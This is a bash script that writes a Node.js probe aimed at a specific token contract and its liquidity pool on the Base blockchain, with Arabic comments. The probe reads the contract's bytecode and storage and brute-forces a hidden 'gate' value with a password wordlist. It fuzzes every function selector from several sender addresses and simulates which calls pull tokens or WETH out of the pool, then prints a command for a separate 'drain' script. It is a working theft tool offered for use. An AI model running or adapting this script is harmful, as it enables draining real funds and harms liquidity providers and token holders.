#!/usr/bin/env bash
set -e
cd "$HOME/slop"
cat > probe2.mjs <<'JS'
import fs from "node:fs";
import { JsonRpcProvider, AbiCoder, Interface, keccak256, toUtf8Bytes,
  solidityPacked, MaxUint256, ZeroAddress, formatUnits, getAddress } from "ethers";
const ME="0xA4BC81CecCC9D8637147Fa4b5daAf55E8f9Ef33f";
const T="0xA5a3A7a1dec1a57E41A0Cdd8c2129CfD7B46b592";
const PAIR="0x69249e64fd8D35036965fa09FadAEdb955D70C31";
const WETH="0x4200000000000000000000000000000000000006";
const MC3="0xcA11bde05977b3631167028862bE2a173976CA11";
const ABI=AbiCoder.defaultAbiCoder();
const MCI=new Interface(["function tryAggregate(bool,tuple(address target,bytes callData)[])"]);
const DIR=process.env.HOME+"/slop/out"; fs.mkdirSync(DIR,{recursive:true});
const log=s=>{console.log(s);fs.appendFileSync(DIR+"/p2.log",s+"\n")};
const pad=v=>v.replace(/^0x/,"").padStart(64,"0");
const balD=a=>"0x70a08231"+pad(a);
const sleep=ms=>new Promise(r=>setTimeout(r,ms));
const RPCS=[process.env.RPC,"https://base-rpc.publicnode.com","https://mainnet.base.org",
 "https://base.llamarpc.com","https://1rpc.io/base","https://base.drpc.org"].filter(Boolean);
const provs=[]; for(const u of RPCS){const q=new JsonRpcProvider(u,8453,{staticNetwork:true});
  try{await q.getBlockNumber();provs.push(q)}catch{}}
if(!provs.length){log("ما في RPC");process.exit(1)}
log("RPCs: "+provs.length);
let ri=0, netFail=0;
async function call(tx){
  let last="";
  for(let a=0;a<5;a++){
    try{ return await provs[(ri++)%provs.length].call(tx); }
    catch(e){
      last=e.shortMessage||e.message||"";
      if(/revert|CALL_EXCEPTION|BAD_DATA/.test(last)) throw e;
      netFail++; await sleep(400*(a+1));
    }
  }
  throw new Error("net:"+last);
}
const bal=async(t,w)=>{try{return BigInt(await call({to:t,data:balD(w)}))}catch{return 0n}};
const sim=async(calls,from)=>{const d=MCI.encodeFunctionData("tryAggregate",[false,calls.map(c=>[c.target,c.data])]);
  const raw=await call({to:MC3,data:d,from,gasLimit:25_000_000});
  return MCI.decodeFunctionResult("tryAggregate",raw)[0].map(r=>({ok:r[0],ret:r[1]}))};

log("block "+await provs[0].getBlockNumber());
const code=await provs[0].getCode(T); fs.writeFileSync(DIR+"/bytecode.txt",code);
const h=code.slice(2), sels=new Set();
for(let i=0;i<h.length-10;i+=2) if(h.slice(i,i+2)==="63") sels.add("0x"+h.slice(i+2,i+10));
sels.delete("0x00000000"); sels.delete("0xffffffff");
const st=[]; for(let i=0;i<320;i++){const v=await provs[0].getStorage(T,i); if(!/^0x0+$/.test(v)) st.push(v)}
const stAddrs=[...new Set(st.filter(v=>/^0x0{24}[0-9a-f]{40}$/.test(v)).map(v=>getAddress("0x"+v.slice(-40))))];
const GATE=await provs[0].getStorage(T,26);
log("selectors="+sels.size+" addrs="+stAddrs.join(","));

const WORDS=["slop","Slop","SLOP","slopcash","SlopCash","Slop Cash","SLOP CASH","slopiscash",
 "SLOP IS CASH","cash","secret","password","admin","123","1234","123456","base","umia","shaw",
 "eliza","elizaos","slop123","slopcash123","test","moon","slop2026","dead","222","gslop","virgen"];
const salts=[ME,...stAddrs,ZeroAddress,T,PAIR];
let gate=null;
for(const w of WORDS){const s=[[keccak256(toUtf8Bytes(w)),w]];
  for(const a of salts){s.push([keccak256(solidityPacked(["address","string"],[a,w])),a+"+"+w]);
    s.push([keccak256(solidityPacked(["string","address"],[w,a])),w+"+"+a])}
  for(const [k,v] of s) if(k.toLowerCase()===GATE.toLowerCase()){gate=v;log(">>> GATE "+v)}}
for(const a of salts) if(keccak256(solidityPacked(["address"],[a])).toLowerCase()===GATE.toLowerCase()){gate=a;log(">>> GATE addr "+a)}

const rS=await bal(T,PAIR), rW=await bal(WETH,PAIR), price=rS?rW*10n**9n/rS:0n;
log(`POOL SLOP=${formatUnits(rS,9)} WETH=${formatUnits(rW,18)}`);

const F=(n,t,f)=>({n,t,f});
const forms=[F("()",[],()=>[]),F("(addr)",["address"],s=>[s]),
 F("(addr,max)",["address","uint256"],s=>[s,MaxUint256]),F("(addr,pairBal)",["address","uint256"],s=>[s,rS]),
 F("(max)",["uint256"],()=>[MaxUint256]),F("(0)",["uint256"],()=>[0n]),F("(true)",["bool"],()=>[true]),
 F("(pair)",["address"],()=>[PAIR]),F("(gate)",["bytes32"],()=>[GATE]),
 F("(gate,addr)",["bytes32","address"],s=>[GATE,s]),F("(addr,pair)",["address","address"],s=>[s,PAIR]),
 F("(pair,max)",["address","uint256"],()=>[PAIR,MaxUint256]),
 F("(addr,pair,max)",["address","address","uint256"],s=>[s,PAIR,MaxUint256])];
const skip=new Set([PAIR.toLowerCase(),WETH.toLowerCase()]);
const senders=[ME,...stAddrs.filter(a=>!skip.has(a.toLowerCase())),ZeroAddress];

/* مرحلة A: فحص مباشر (بيشتغل مع msg.sender = أنت) */
const ok=[];
let nOk=0,nRev=0,nErr=0;
for(const from of senders) for(const f of forms) for(const s of sels){
  let d; try{d=s+ABI.encode(f.t,f.f(from)).slice(2)}catch{continue}
  try{ const r=await call({to:T,data:d,from,gasLimit:2_500_000});
    if(r&&r!=="0x"){nOk++;ok.push({s,f,from,d})} else nRev++;
  }catch(e){ /revert/.test(e.shortMessage||e.message||"") ? nRev++ : nErr++; }
  await sleep(120);
}
log(`\nمباشر: نجح=${nOk} revert=${nRev} خطأ شبكة=${nErr}`);

/* مرحلة B: قياس الفرق بالحوض للنداءات الناجحة فقط */
const hits=[];
for(const it of ok){
  const calls=[{target:T,data:"0x095ea7b3"+pad(T)+pad((2n**256n-1n).toString(16))},
               {target:T,data:"0x095ea7b3"+pad(PAIR)+pad((2n**256n-1n).toString(16))},
               {target:T,data:it.d},{target:T,data:balD(PAIR)},{target:WETH,data:balD(PAIR)}];
  try{
    const r=await sim(calls,it.from);
    const aS=BigInt(r[3].ret||0), aW=BigInt(r[4].ret||0);
    if(aS<rS||aW<rW){
      const got=rS-aS, wl=rW-aW;
      hits.push({sel:it.s,form:it.f.n,from:it.from,calldata:it.d,
        delta:`pairSLOP -${formatUnits(got,9)} | pairWETH -${formatUnits(wl,18)}`,
        score:String(wl+got*price/10n**9n)});
      log(`>>> HIT ${it.s} ${it.f.n} from=${it.from} ${hits.at(-1).delta}`);
    }
  }catch(e){}
  await sleep(200);
}
hits.sort((a,b)=>BigInt(b.score)>BigInt(a.score)?1:-1);
fs.writeFileSync(DIR+"/hits2.json",JSON.stringify({gate,hits,stats:{nOk,nRev,nErr}},null,2));
log("\nHITS: "+hits.length);
if(hits.length) log("خطة: node drain.mjs exec \""+hits[0].calldata+"\"");
process.exit(0);
JS
echo ok
